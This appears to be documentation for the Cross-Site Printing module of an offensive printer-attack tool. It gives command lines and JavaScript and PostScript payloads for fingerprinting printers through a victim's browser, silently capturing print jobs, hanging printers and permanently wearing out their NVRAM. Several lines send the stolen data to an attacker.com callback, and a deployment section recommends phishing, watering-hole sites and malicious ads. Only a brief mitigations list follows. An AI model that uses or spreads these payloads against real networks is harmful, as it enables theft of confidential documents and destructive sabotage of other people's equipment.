# Cross-Site Printing (XSP)

Cross-Site Printing exploits the fact that browsers bypass the Same-Origin Policy when sending print jobs. An attacker can embed a hidden `<form>` or `<script>` in a webpage that, when loaded by the victim, sends arbitrary data (PJL/PostScript payloads) directly from the victim's browser to an internal printer on the same network segment.

---

## How It Works

1. Attacker hosts a malicious HTML page (served over the internet or via phishing)
2. Victim's browser loads the page (inside the corporate network)
3. The page JavaScript submits a hidden form POST to `http://192.168.1.100:9100/` (the internal printer)
4. The printer receives and executes the embedded PJL/PS payload
5. The victim's browser does not block this — RAW/9100 is not restricted by CORS for form submissions

This technique bypasses all network-level firewalls that allow outbound HTTP, and works even when the printer is on a private, non-routable subnet.

---

## Usage

```bash
# Information disclosure — extract printer ID, firmware, serial
python printer-reaper.py 192.168.1.100 --xsp info

# Job capture — silently capture all print jobs going forward
python printer-reaper.py 192.168.1.100 --xsp capture

# DoS — print storm (resource exhaustion)
python printer-reaper.py 192.168.1.100 --xsp dos

# NVRAM damage (physical wear via write loop)
python printer-reaper.py 192.168.1.100 --xsp nvram

# Retrieve previously captured jobs
python printer-reaper.py 192.168.1.100 --xsp exfil

# With callback URL for automatic data exfiltration
python printer-reaper.py 192.168.1.100 --xsp capture \
  --xsp-callback https://attacker.com/recv

python printer-reaper.py 192.168.1.100 --xsp info \
  --xsp-callback https://attacker.com/recv
```

---

## Payload Types

### `info` — Printer Information Disclosure

Generates an HTML page that, when loaded in a victim's browser, extracts printer identity (model, firmware, serial, IP config) and sends it to the callback URL.

**Generated payload technique:**
```javascript
// Hidden form POST to port 9100 (bypasses SOP for form submissions)
var form = document.createElement('form');
form.method = 'POST';
form.action = 'http://192.168.1.100:9100/';
// Adds hidden field with @PJL INFO ID payload
// Response is captured via XMLHttpRequest and sent to callback
```

### `capture` — Print Job Capture

Embeds a PostScript `exitserver` + input filter in the printer via the victim browser. All subsequent print jobs are silently duplicated and stored in printer memory, retrievable with `--xsp exfil`.

**PostScript payload (abbreviated):**
```postscript
serverdict begin 0 exitserver
/startjob { ... } def
% Redefine showpage to intercept job content
/showpage {
  % store job in userdict for later retrieval
  currentfile ... /capturedict where { ... }
  systemdict /showpage get exec
} def
```

### `dos` — Denial of Service

Sends a hidden POST containing a PS infinite loop or PJL NVRAM-exhaustion loop. When the victim loads the page:
- The printer receives the job and hangs (PS loop) or begins wearing out NVRAM (PJL loop)

```postscript
% DoS payload inside the XSP HTML:
serverdict begin 0 exitserver
{ } loop
```

### `nvram` — NVRAM Physical Damage

Repeatedly writes to the printer's NVRAM via PJL `DEFAULT` commands, eventually exhausting the write cycle limit (typically 100,000 writes for flash NVRAM). This is a destructive, permanent attack.

```
@PJL DEFAULT COPIES=1
@PJL DEFAULT COPIES=2
... (repeated in JS loop)
```

### `exfil` — Retrieve Captured Jobs

If `--xsp capture` was used previously and the printer is still powered, this payload retrieves the captured jobs from the printer's memory via the victim's browser and sends them to the callback URL.

---

## Deployment

Generated payloads are saved to `.log/xsp_<type>.html`. Deploy them via:

- **Phishing email** — embed in HTML email body or link to hosted page
- **Watering hole** — inject into a site visited by corporate users
- **Malicious ad** — if the company uses a printer on the same network as an employee's browser session
- **LAN access** — if already on the network, host locally

**Important:** The victim must be on the same network as the target printer (or a network that can reach it). This is almost always the case inside corporate environments.

---

## CORS Spoofing

Some printer EWS interfaces respond to cross-origin requests with overly permissive CORS headers (`Access-Control-Allow-Origin: *`). PrinterReaper's XSP module exploits this to make authenticated API calls from the victim's browser to the printer's web interface:

```javascript
// Printer responds with: Access-Control-Allow-Origin: *
// This allows reading the response body, unlike a normal cross-origin block
fetch('http://192.168.1.100/status', { credentials: 'include' })
  .then(r => r.text())
  .then(data => fetch('https://attacker.com/recv', {method:'POST', body:data}));
```

This is distinct from the form-POST XSP technique and allows full read access to the printer's web API.

---

## Mitigations (for defenders)

- Disable port 9100 (RAW printing) if not required
- Enable firewall rules blocking internal printer IPs from browser-reachable segments
- Use HTTPS-only EWS with proper CORS headers
- Enable printer authentication for all job submissions
- Deploy Content Security Policy (CSP) on internal web applications
